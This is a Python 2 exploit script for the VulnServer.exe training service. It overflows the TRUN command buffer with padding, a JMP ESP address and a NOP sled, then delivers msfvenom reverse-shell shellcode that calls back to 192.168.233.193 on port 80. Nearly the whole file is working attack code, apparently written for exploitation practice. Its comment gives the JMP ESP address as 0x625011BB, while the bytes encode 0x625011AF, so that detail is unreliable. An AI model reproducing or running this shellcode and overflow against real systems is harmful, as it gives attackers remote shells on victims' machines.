# Remote exploitation of the VulnServer.exe service
# 2019 Douglas Berdeaux, WeakNetLabs, Demon Linux
import sys
import socket as so

## Args ./vulnServExploit.py (server IP) (port)
server = sys.argv[1] # string OK
port = int(sys.argv[2]) # socket requires and integer

# no bad bytes? What? well, I mean, \x00, obviously that would nullify the strncpy() attack lol

## Payload:
# msfvenom --platform windows LHOST=192.168.233.193 LPORT=80 -a x86 -p \
# windows/shell_reverse_tcp -f python -b '\x00' -e x86/shikata_ga_nai

buf =  ""
buf += "\xb8\x60\x48\x60\x2f\xd9\xc5\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x52\x83\xef\xfc\x31\x47\x0e\x03\x27\x46\x82"
buf += "\xda\x5b\xbe\xc0\x25\xa3\x3f\xa5\xac\x46\x0e\xe5\xcb"
buf += "\x03\x21\xd5\x98\x41\xce\x9e\xcd\x71\x45\xd2\xd9\x76"
buf += "\xee\x59\x3c\xb9\xef\xf2\x7c\xd8\x73\x09\x51\x3a\x4d"
buf += "\xc2\xa4\x3b\x8a\x3f\x44\x69\x43\x4b\xfb\x9d\xe0\x01"
buf += "\xc0\x16\xba\x84\x40\xcb\x0b\xa6\x61\x5a\x07\xf1\xa1"
buf += "\x5d\xc4\x89\xeb\x45\x09\xb7\xa2\xfe\xf9\x43\x35\xd6"
buf += "\x33\xab\x9a\x17\xfc\x5e\xe2\x50\x3b\x81\x91\xa8\x3f"
buf += "\x3c\xa2\x6f\x3d\x9a\x27\x6b\xe5\x69\x9f\x57\x17\xbd"
buf += "\x46\x1c\x1b\x0a\x0c\x7a\x38\x8d\xc1\xf1\x44\x06\xe4"
buf += "\xd5\xcc\x5c\xc3\xf1\x95\x07\x6a\xa0\x73\xe9\x93\xb2"
buf += "\xdb\x56\x36\xb9\xf6\x83\x4b\xe0\x9e\x60\x66\x1a\x5f"
buf += "\xef\xf1\x69\x6d\xb0\xa9\xe5\xdd\x39\x74\xf2\x22\x10"
buf += "\xc0\x6c\xdd\x9b\x31\xa5\x1a\xcf\x61\xdd\x8b\x70\xea"
buf += "\x1d\x33\xa5\xbd\x4d\x9b\x16\x7e\x3d\x5b\xc7\x16\x57"
buf += "\x54\x38\x06\x58\xbe\x51\xad\xa3\x29\x9e\x9a\x42\x68"
buf += "\x76\xd9\x94\x6b\xd7\x54\x72\x01\xc7\x30\x2d\xbe\x7e"
buf += "\x19\xa5\x5f\x7e\xb7\xc0\x60\xf4\x34\x35\x2e\xfd\x31"
buf += "\x25\xc7\x0d\x0c\x17\x4e\x11\xba\x3f\x0c\x80\x21\xbf"
buf += "\x5b\xb9\xfd\xe8\x0c\x0f\xf4\x7c\xa1\x36\xae\x62\x38"
buf += "\xae\x89\x26\xe7\x13\x17\xa7\x6a\x2f\x33\xb7\xb2\xb0"
buf += "\x7f\xe3\x6a\xe7\x29\x5d\xcd\x51\x98\x37\x87\x0e\x72"
buf += "\xdf\x5e\x7d\x45\x99\x5e\xa8\x33\x45\xee\x05\x02\x7a"
buf += "\xdf\xc1\x82\x03\x3d\x72\x6c\xde\x85\x82\x27\x42\xaf"
buf += "\x0a\xee\x17\xed\x56\x11\xc2\x32\x6f\x92\xe6\xca\x94"
buf += "\x8a\x83\xcf\xd1\x0c\x78\xa2\x4a\xf9\x7e\x11\x6a\x28"

## JMP ESP in essfunc.dll is: 0x625011BB
jmpEsp = '\xaf\x11\x50\x62'

## for sanity:
payload = buf

bufferFullLen = 3024
# I chose this buffer length because if you look at the sauce, you see this:
# 209:	strncpy(TrunBuf, RecvBuf, 3000);

## Construct Buffer String:
buffer = "TRUN ." + 'A' * 2006 + jmpEsp + '\x90' * (bufferFullLen - 2006 - 4 - len(payload)) + payload
# The prepended "." is because if you look at the sauce, you see this:
# 208:	if ((char)RecvBuf[i] == '.') { // found in a loop, which calls the defective line 209 shown above.

print "[*] Buffer string length: " + str(len(buffer))

s = so.socket(so.AF_INET,so.SOCK_STREAM)
print "[*] Sending buffer overflow to " + server + ":" + str(port)
s.connect((server,port))
s.send(buffer + '\r\n')
print "[*] Buffer String Sent."
